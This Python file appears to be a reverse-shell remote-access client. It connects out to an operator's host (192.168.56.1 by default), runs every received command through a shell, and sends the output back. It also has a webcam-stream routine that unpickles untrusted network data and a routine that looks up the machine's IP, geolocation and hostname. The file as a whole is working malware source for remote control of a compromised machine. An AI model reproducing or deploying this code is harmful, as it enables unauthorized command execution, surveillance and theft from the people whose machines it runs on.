import sys
import subprocess
import os
import requests
import socket
import cv2
import pickle
import struct


HOST = sys.argv[1] if len(sys.argv) > 1 else '192.168.56.1'
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 8080)

s = socket.socket()
s.connect((HOST, PORT))

def web_stream():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = '192.168.56.1'
    port = 9999
    client_socket.connect((host_ip, port))
    data = b""
    payload_size = struct.calcsize("Q")
    while True:
        while len(data) < payload_size:
            packet = client_socket.recv(4 * 1024)
            if not packet: break
            data += packet
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]

        while len(data) < msg_size:
            data += client_socket.recv(4 * 1024)
        frame_data = data[:msg_size]
        data = data[msg_size:]
        frame = pickle.loads(frame_data)
        if cv2.waitKey(1) == ord('q'):
            break
    client_socket.close()
def infograb():
    ip = requests.get("http://ip-api.com/json").json()
    print("IP: " + ip["query"])

    print("\nLongitude:")
    print(ip["lon"])
    print("\nLatitude:")
    print(ip["lat"])
    f = socket.gethostname()
    print("\n" + f)
    print(socket.gethostbyname(f))
    print(socket.gethostbyaddr(f))
while True:
    try:
        cmd = s.recv(1024).decode("utf-8")
        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

        if cmd.lower()[:2] == "cd":
            os.chdir(cmd[3:])

        if len(cmd) > 0:
            result = subprocess.Popen(cmd[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            outputbytes = result.stdout.read() + result.stderr.read()
            outputstr = str(outputbytes, "utf-8")
            s.send(str.encode(outputstr + str(os.getcwd()) + "> "))

        if cmd.lower() == "web.stream":
            web_stream()

        if cmd.lower() == "grabinfo":
            info = infograb()
            s.send(str.encode(str(info), "utf-8"))

    except ConnectionResetError:
        pass
s.close()
